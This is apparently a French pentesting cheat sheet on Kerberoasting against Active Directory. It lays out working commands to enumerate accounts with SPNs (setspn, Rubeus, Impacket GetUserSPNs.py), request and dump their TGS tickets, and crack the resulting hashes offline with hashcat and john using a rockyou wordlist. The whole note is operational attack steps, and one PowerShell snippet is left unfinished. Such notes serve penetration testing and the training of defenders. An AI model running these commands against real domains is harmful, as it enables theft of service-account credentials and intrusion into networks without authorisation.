---
public: true # set to true to make the article publishable
---
## Sources

- https://dl.packetstormsecurity.net/papers/general/kerberoasting.pdf

## Objectifs
- Obtenir une liste de compte utilisateurs disposant d'un SPN
- Collecter les TGS associés à ces SPNs (chiffrés en RC4)
- Tenter de cracker les mots de passe des comptes utilisateurs à partir des TGS récupérés (qui sont chiffrés avec les hash de comptes utilisateurs respectifs)

## Méthodologie
### Locale

#### Manuelle

```shell
# Enumérer tous les SPNs
setspn.exe -q */*
```

```powershell
# Demander un TGS pour le 
```
#### Utiliser Rubeus.exe

Il réalise les opérations suivantes :
- découverte des SPNs
- Dump des TGS
- Obtention des Hashs
- 
./Rubeus.exe kerberoast /outfile:hash.txt


#### Cracker les hash :

hashcat -m 13100 --force -a 0 hash.txt dict.txt

### Distante

#### Impacket

##### Utiliser GetUserSPNs.py
 Il réalise les opérations suivantes :
- découverte des SPNs
- Dump des TGS
- Obtention des Hashs

```
# Liste des comptes disposant d'un SPN
GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD

# Récupération des TGS
GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request

# Récupération d'un unique TGS
GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request-user interesting.user

# Enregistrement des TGS pour les fournier à john / hashcat (fichier 'hashes.txt')
GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request -outputfile hashes.txt
```

##### Cracker les hash (bruteforce)

```
john --wordlist=/path/to/rockyou.txt hashes.txt
```
[[_Techniques/Mots de passe/Casser un mot de passe/Hashcat]]
